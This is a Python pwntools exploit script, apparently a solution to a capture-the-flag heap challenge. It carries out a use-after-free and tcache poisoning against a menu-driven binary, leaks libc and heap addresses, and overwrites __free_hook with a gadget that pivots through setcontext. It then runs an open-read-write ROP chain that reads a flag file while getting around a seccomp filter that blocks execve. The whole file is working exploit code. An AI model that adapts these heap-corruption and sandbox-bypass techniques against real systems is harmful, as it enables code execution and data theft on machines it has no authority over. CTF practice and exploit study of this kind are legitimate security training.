from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 0
elf_path = "./pwn"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        # r = gdb.debug(elf_path,'set debug-file-directory ./.debug/')
        # gdb.attach(r,'b* 0x4012ed')
        r = process(elf_path)
        gdb.attach(r)
        # pause()
        pass
    else:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset].decode(),16)

    show_addr(name,addr)
    return addr


elf = ELF(elf_path)


def menu(num):
    r.sendlineafter(b'>> \n',str(num).encode())

def add(size,context):
    menu(2)
    # 0xF <= Size <= 0x500
    r.sendlineafter(b'budget.\n',str(size).encode())
    r.sendlineafter(b'Content: \n',context)
    
def load(index):
    menu(3)
    r.sendlineafter(b'whitch one do you want to load\n',str(index).encode())

def show(index):
    menu(1)
    r.sendlineafter(b'Do you want to take a few pictures?\n',str(index).encode())

for i in range(7):
    add(0x100,b'Z') #0 - 6

add(0x100,b'A') # 7
add(0x100,b'B') # 8


add(0x100,b'C') # 9 # previous chunk
add(0x100,b'D') # 10 # victim chunk
add(0x100,b'E') # 11

for i in range(6):
    load(i)
    show(2)

load(8)
load(7)
load(6)
show(4)

add(0x200,b'\xf0') #0

load(0)
show(2)

libc = ELF('./libc.so.6')
r.recvuntil(b'The film content: ')
libc.address = revc_addr('main_neara') - 0x1ecdf0
show_addr('libc.addr',libc.address)

add(0x100,b'A') #0
load(0)
show(2)
r.recvuntil(b'The film content: ')
heap_base = revc_addr('heap_chunk',b'Over',-5) - 0x741
show_addr('heap_base',heap_base)

add(0x80,b'temp') #0 0x558facc59f50

load(10) # victim chunk 0x555dfcdfbc20
load(0)
show(3)

# 0chunk.next -> 10chunk
# 10chunk.next -> 0
# chunkptr -> 0

load(9) # previous chunk
show(2)
# chunkptr -> 0

# ---------------
# previous chunk # 0x555da9201c20
# ---------------
# victim chunk # 0x555da9201d40
# ---------------

add(0x80,b'temp') #0
add(0x100,b'Z') #1
load(0)
show(3) # 再free(10) UAF



# #  line  CODE  JT   JF      K
# # =================================
# #  0000: 0x20 0x00 0x00 0x00000004  A = arch
# #  0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
# #  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
# #  0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
# #  0004: 0x06 0x00 0x00 0x00000000  return KILL
# #  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
# system GG

magic_gadget = libc.address + 0x0151990
add(0x120,b'A'* 0x110 + p64(libc.sym['__free_hook'])) #0

add(0x100,b'A') #1
add(0x100,p64(magic_gadget)) #2

show_addr(b'heap_base',heap_base)

orw_addr = heap_base + 0xfe0 
rop = ROP(libc)
rop.base = orw_addr + 0x8
rop.open(b'flag',0,0)
rop.read(3,orw_addr + 0x10 +0x200,0x30)
rop.write(1,orw_addr + 0x10 +0x200,0x30)
rdi_addr = heap_base + 0x14f0 + 0x10 
rdi_payload =  p64(0) + p64(rdi_addr) + p64(0) * 2 + p64(libc.sym['setcontext']+61) + p64(0) #0x30
# 0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
rdi_payload += p64(0) * int(0x70 / 8) + p64(orw_addr+0x10) + rop.chain()[:8]

add(0x500,rop.chain()[8:]) #3
add(0x300,rdi_payload) #4

load(5)
# pause()
show(2)





r.interactive()